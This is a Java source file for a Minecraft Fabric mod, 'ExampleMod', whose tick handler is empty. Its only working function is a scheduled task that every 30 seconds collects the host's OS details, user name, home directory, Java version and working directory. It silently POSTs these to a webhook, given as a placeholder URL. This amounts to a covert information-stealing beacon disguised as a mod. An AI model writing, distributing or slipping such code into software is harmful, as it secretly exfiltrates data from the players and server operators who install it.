package com.example;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.minecraft.server.MinecraftServer;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ExampleMod implements ModInitializer {

    private static final String WEBHOOK_URL = "https://your-webhook-url-here";
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    @Override
    public void onInitialize() {
        ServerTickEvents.END_SERVER_TICK.register(this::onServerTick);
        scheduler.scheduleAtFixedRate(this::sendSystemInfo, 0, 30, TimeUnit.SECONDS);
    }

    private void onServerTick(MinecraftServer server) {
    }

    private void sendSystemInfo() {
        try {
            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String osArch = System.getProperty("os.arch");
            String userName = System.getProperty("user.name");
            String userHome = System.getProperty("user.home");
            String javaVersion = System.getProperty("java.version");
            String javaVendor = System.getProperty("java.vendor");
            String workingDir = System.getProperty("user.dir");

            String jsonPayload = String.format(
                "{\"content\":\"**System Info**\\n" +
                "OS: %s %s (%s)\\n" +
                "User: %s\\n" +
                "Home: %s\\n" +
                "Java: %s (%s)\\n" +
                "Working Dir: %s\"}",
                osName, osVersion, osArch,
                userName,
                userHome,
                javaVersion, javaVendor,
                workingDir
            );

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode != 200 && responseCode != 204) {
                System.err.println("Webhook response code: " + responseCode);
            }

            connection.disconnect();

        } catch (Exception e) {
            System.err.println("sendSystemInfo error: " + e.getMessage());
        }
    }
}
